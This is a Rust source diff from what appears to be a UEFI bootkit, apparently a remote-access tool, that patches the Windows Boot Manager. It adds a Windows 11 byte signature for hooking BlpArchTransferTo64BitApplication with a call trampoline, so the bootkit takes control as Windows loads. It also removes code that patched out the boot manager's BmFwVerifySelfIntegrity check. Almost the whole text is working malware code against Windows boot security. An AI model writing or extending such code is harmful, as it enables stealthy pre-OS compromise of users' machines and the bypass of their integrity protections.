@@ -2,7 +2,7 @@ use core::mem;
 use core::sync::atomic::{AtomicI64, Ordering};
 
 use log::{error, info};
-use rat_common::windows::utils::{insert_call_trampoline, return_zero_patch};
+use rat_common::windows::utils::insert_call_trampoline;
 
 use crate::hooks::winload::patch_winload;
 use crate::patcher::VariablePatternFinder;
@@ -20,6 +20,7 @@ type _BlpArchTransferTo64BitApplicationFn = unsafe extern "efiapi" fn(
 static _ORIGINAL_BLP_ARCH_TRANSFER_TO64_BIT_APPLICATION: AtomicI64 = AtomicI64::new(0);
 
 const _BLP_ARCH_TRANSFER_TO64_BIT_APPLICATION: &[[u8; 21]] = &[
+    // Windows 10
     [
         0x03, 0x4D, 0x67, 0x48, 0x89, 0x44, 0x24, 0x28, // 8 bytes before
         0xE8, 0xFE, 0x29, 0x08, 0x00, // call BlpArchTransferTo64BitApplication
@@ -30,13 +31,13 @@ const _BLP_ARCH_TRANSFER_TO64_BIT_APPLICATION: &[[u8; 21]] = &[
         0xE8, 0x8E, 0x37, 0x08, 0x00, // call BlpArchTransferTo64BitApplication
         0x44, 0x8B, 0xF0, 0xE8, 0xA6, 0xBF, 0x00, 0x00, // 8 bytes after
     ],
+    // Windows 11
+    [
+        0x4D, 0x8B, 0xCE, 0x44, 0x88, 0x64, 0x24, 0x20, // 8 bytes before
+        0xE8, 0x42, 0xAA, 0x08, 0x00, // call BlpArchTransferTo64BitApplication
+        0x8B, 0xF0, 0xE8, 0x7B, 0xC3, 0x00, 0x00, 0x48, // 8 bytes after
+    ],
 ];
-
-const _BM_FW_VERIFY_SELF_INTEGRITY: &[[u8; 17]] = &[[
-    0xCC, // 1 byte before (int)
-    0x89, 0x4C, 0x24, 0x08, 0x55, 0x53, 0x56, 0x57, // first 8 bytes
-    0x41, 0x55, 0x41, 0x56, 0x48, 0x8B, 0xEC, 0x48, // next 8 bytes
-]];
 
 unsafe extern "efiapi" fn _blp_arch_transfer_to64_bit_application_hooked(
     entrypoint: *mut u8,
@@ -71,19 +72,6 @@ unsafe extern "efiapi" fn _blp_arch_transfer_to64_bit_application_hooked(
 
 pub fn patch_bootmgfw(bootmgfw: &mut [u8]) {
     info!("Patching bootmgfw_old.efi...");
-
-    match VariablePatternFinder::new(_BM_FW_VERIFY_SELF_INTEGRITY).find_mut(bootmgfw) {
-        Some(original) => {
-            let original = &mut original[1..];
-            let patched = return_zero_patch();
-            original[..patched.len()].copy_from_slice(patched);
-            info!("Patched BmFwVerifySelfIntegrity");
-        }
-        None => {
-            error!("Cannot find BmFwVerifySelfIntegrity");
-            return;
-        }
-    }
 
     if let Some(original) =
         VariablePatternFinder::new(_BLP_ARCH_TRANSFER_TO64_BIT_APPLICATION).find_mut(bootmgfw)
